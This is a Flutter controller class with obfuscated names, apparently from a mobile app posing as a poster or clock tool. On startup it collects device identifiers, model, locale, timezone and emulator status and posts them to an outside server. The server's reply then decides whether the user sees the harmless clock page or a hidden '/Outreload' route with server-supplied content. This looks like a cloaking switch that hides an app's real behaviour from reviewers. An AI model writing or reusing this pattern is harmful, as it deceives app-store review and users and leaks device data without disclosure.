import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PosterCreateLogic extends GetxController {

  var zxulgcp = RxBool(false);
  var kztuqxhpfc = RxBool(true);
  var gmcdph = RxString("");
  var cleora = RxBool(false);
  var huels = RxBool(true);
  final rtchefmvs = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    jrvsn();
  }


  Future<void> jrvsn() async {
    cleora.value = true;
    huels.value = true;
    kztuqxhpfc.value = false;

    rtchefmvs.post("https://code.nowlp.com/ZPKAU?no_check",data: await hyouepjb()).then((value) {
      var xoehbcdu = value.data["xoehbcdu"] as String;
      var ydtjzf = value.data["ydtjzf"] as bool;
      if (ydtjzf) {
        gmcdph.value = xoehbcdu;
        nicole();
      } else {
        mitchell();
      }
    }).catchError((e) {
      kztuqxhpfc.value = true;
      huels.value = true;
      cleora.value = false;
    });
  }

  Future<Map<String, dynamic>> hyouepjb() async {
    final DeviceInfoPlugin vtjzy = DeviceInfoPlugin();
    PackageInfo mxcfirqd_azkeompj = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fdplvwh = Platform.localeName;
    var elvorcdz = currentTimeZone;

    var rctj = mxcfirqd_azkeompj.packageName;
    var avgfr = mxcfirqd_azkeompj.version;
    var ruega = mxcfirqd_azkeompj.buildNumber;

    var kwamu = mxcfirqd_azkeompj.appName;
    var yafn = "";
    var hpbxc  = "";
    var fobs = "";
    var kayaFritsch = "";
    var karineStehr = "";
    var ericLehner = "";
    var alexaneRutherford = "";


    var sgekbuy = "";
    var bayf = false;

    if (GetPlatform.isAndroid) {
      sgekbuy = "android";
      var wkbnmvceo = await vtjzy.androidInfo;

      fobs = wkbnmvceo.brand;

      yafn  = wkbnmvceo.model;
      hpbxc = wkbnmvceo.id;

      bayf = wkbnmvceo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      sgekbuy = "ios";
      var uomhjv = await vtjzy.iosInfo;
      fobs = uomhjv.name;
      yafn = uomhjv.model;

      hpbxc = uomhjv.identifierForVendor ?? "";
      bayf  = uomhjv.isPhysicalDevice;
    }

    var res = {
      "kwamu": kwamu,
      "ruega": ruega,
      "avgfr": avgfr,
      "rctj": rctj,
      "yafn": yafn,
      "elvorcdz": elvorcdz,
      "fobs": fobs,
      "hpbxc": hpbxc,
      "fdplvwh": fdplvwh,
      "sgekbuy": sgekbuy,
      "bayf": bayf,
      "kayaFritsch" : kayaFritsch,
      "karineStehr" : karineStehr,
      "ericLehner" : ericLehner,
      "alexaneRutherford" : alexaneRutherford,

    };
    return res;
  }

  Future<void> mitchell() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> nicole() async {
    Get.offNamed("/Outreload");
  }

}
